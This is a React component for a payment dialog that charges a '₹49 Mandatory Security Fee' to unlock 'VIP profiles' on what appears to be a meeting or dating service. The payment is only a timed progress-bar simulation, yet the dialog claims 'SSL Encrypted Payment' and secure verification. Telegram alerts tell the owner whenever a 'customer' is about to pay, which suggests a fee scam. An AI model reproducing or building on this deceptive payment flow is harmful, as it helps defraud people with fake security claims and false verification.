
"use client";

import React from "react";
import { CheckCircle2, ShieldCheck, Loader2, Lock, ArrowRight } from "lucide-react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Progress } from "@/components/ui/progress";
import { notifyOwner } from "@/app/actions/telegram";

interface PaymentDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  onSuccess: () => void;
}

export function PaymentDialog({ open, onOpenChange, onSuccess }: PaymentDialogProps) {
  const [step, setStep] = React.useState<"initial" | "processing" | "success">("initial");
  const [progress, setProgress] = React.useState(0);

  // Handle side effects when payment reaches 100%
  React.useEffect(() => {
    if (progress === 100 && step === "processing") {
      setStep("success");
      notifyOwner("<b>✅ PAYMENT SUCCESSFUL:</b> User ne ₹49 pay kar diye hain. Verification complete.");
    }
  }, [progress, step]);

  const startRazorpayPayment = async () => {
    await notifyOwner("<b>🚨 PAYMENT ATTEMPT:</b> Customer payment page pe hai. ₹49 pay karne wala hai.");
    setStep("processing");
    setProgress(0);
    
    const duration = 3000; // 3 seconds simulation
    const intervalTime = 100;
    const steps = duration / intervalTime;
    const increment = 100 / steps;

    const interval = setInterval(() => {
      setProgress((prev) => {
        if (prev >= 100) {
          clearInterval(interval);
          return 100;
        }
        return Math.min(prev + increment, 100);
      });
    }, intervalTime);
  };

  const handleFinish = () => {
    onSuccess();
    // Reset state after a delay to allow dialog to close smoothly
    setTimeout(() => {
      setStep("initial");
      setProgress(0);
    }, 300);
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-md bg-white border-none rounded-[3rem] overflow-hidden shadow-2xl p-0">
        <div className="bg-slate-900 p-8 text-center text-white space-y-3 relative overflow-hidden border-b-4 border-primary">
          <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-primary via-secondary to-accent" />
          <DialogTitle className="font-headline text-2xl font-black tracking-tight">
            {step === "success" ? "ACCESS UNLOCKED" : "SECURE GATEWAY"}
          </DialogTitle>
          <p className="text-[9px] font-black opacity-60 uppercase tracking-[0.4em]">
            REAL MEET VERIFICATION SYSTEM
          </p>
        </div>

        <div className="p-10 space-y-8 flex flex-col items-center">
          {step === "initial" && (
            <>
              <div className="relative">
                <div className="w-24 h-24 bg-slate-50 rounded-[2.5rem] flex items-center justify-center text-primary shadow-inner border-2 border-slate-100">
                  <Lock className="w-10 h-10" />
                </div>
                <div className="absolute -bottom-2 -right-2 bg-secondary p-2 rounded-full border-4 border-white shadow-lg">
                  <ShieldCheck className="w-5 h-5 text-white" />
                </div>
              </div>
              
              <div className="text-center space-y-2">
                <div className="flex items-center justify-center gap-1">
                   <span className="text-6xl font-black italic text-slate-900 tracking-tighter">₹49</span>
                </div>
                <p className="text-[10px] font-black text-slate-400 uppercase tracking-[0.2em]">Mandatory Security Fee</p>
              </div>

              <div className="w-full space-y-4">
                <Button 
                  onClick={startRazorpayPayment} 
                  className="w-full bg-primary hover:bg-primary/95 text-white font-black h-20 rounded-[1.5rem] shadow-2xl shadow-primary/20 text-xl flex items-center justify-between px-8 border-b-4 border-black/10 transition-all active:scale-95"
                >
                  <span>PAY SECURELY</span>
                  <ArrowRight className="w-6 h-6" />
                </Button>
                <div className="flex items-center justify-center gap-6 text-[10px] font-bold text-slate-400 uppercase tracking-widest">
                  <span>UPI</span>
                  <span>CARDS</span>
                  <span>WALLETS</span>
                </div>
              </div>

              <div className="flex items-center gap-2 bg-slate-50 px-4 py-2 rounded-full border border-slate-100">
                <ShieldCheck className="w-4 h-4 text-secondary" />
                <span className="text-[9px] font-black text-slate-500 uppercase tracking-widest">SSL Encrypted Payment</span>
              </div>
            </>
          )}

          {step === "processing" && (
            <div className="w-full py-12 space-y-8 text-center">
              <div className="relative inline-flex">
                <div className="w-20 h-20 border-4 border-slate-100 rounded-full" />
                <div className="absolute inset-0 flex items-center justify-center">
                   <Loader2 className="w-12 h-12 animate-spin text-primary" />
                </div>
              </div>
              <div className="space-y-4">
                <p className="text-lg font-black text-slate-900 uppercase italic">Verifying Payment...</p>
                <div className="px-4">
                  <Progress value={progress} className="h-2 bg-slate-100 rounded-full" />
                </div>
                <p className="text-[10px] text-slate-400 font-bold tracking-widest uppercase">Encryption in progress</p>
              </div>
            </div>
          )}

          {step === "success" && (
            <>
              <div className="w-28 h-28 bg-secondary/10 rounded-[2.5rem] flex items-center justify-center text-secondary animate-in zoom-in duration-700 border-2 border-secondary/20">
                <CheckCircle2 className="w-16 h-16" />
              </div>
              <div className="text-center space-y-3">
                <p className="text-2xl font-black text-slate-900 uppercase">ACCESS GRANTED</p>
                <p className="text-sm text-slate-500 font-bold">Manager calls and VIP profiles are now unlocked.</p>
              </div>
              <Button 
                onClick={handleFinish} 
                className="w-full bg-secondary hover:bg-secondary/95 text-white font-black h-20 rounded-[1.5rem] shadow-2xl shadow-secondary/20 text-lg border-b-4 border-black/10 transition-all active:scale-95"
              >
                GO TO DASHBOARD
              </Button>
            </>
          )}
        </div>
      </DialogContent>
    </Dialog>
  );
}
